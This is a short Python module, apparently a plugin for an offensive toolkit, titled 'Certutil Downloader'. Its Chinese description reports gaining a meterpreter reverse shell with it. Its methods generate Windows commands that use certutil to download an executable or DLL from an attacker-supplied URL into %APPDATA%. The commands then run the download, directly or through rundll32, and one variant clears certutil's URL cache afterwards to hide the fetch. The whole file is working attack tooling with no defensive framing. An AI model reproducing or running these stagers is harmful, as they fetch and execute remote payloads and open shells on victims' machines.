# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'Certutil Donwloader',
            'Author': 'whois',
            'Update': '2018/9/15',
        }

        self.desc_reverse = """
利用certutil程序进行下载文件并执行，win2003能下载但无法自定义保存
查看缓存项目：certutil.exe -urlcache *

测试在network service权限下进行反弹shell成功，得到meterpreter


测试平台：Win2003以上，不包括WinXP


"""

    def reverse(self, url, ran):
        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.exe&%APPDATA%\\{ran}.exe&certutil.exe -urlcache -split -f {url} delete".format(ran=ran, url=url)

    def reverse2(self, url, ran):
        return "certutil.exe -urlcache -split -f {url} %APPDATA%\\{ran}.dll&&rundll32.exe %APPDATA%\\{ran}.dll,StartW".format(ran=ran, url=url)

    def downloader(self, url):
        return "certutil -urlcache -split -f {0}".format(url)
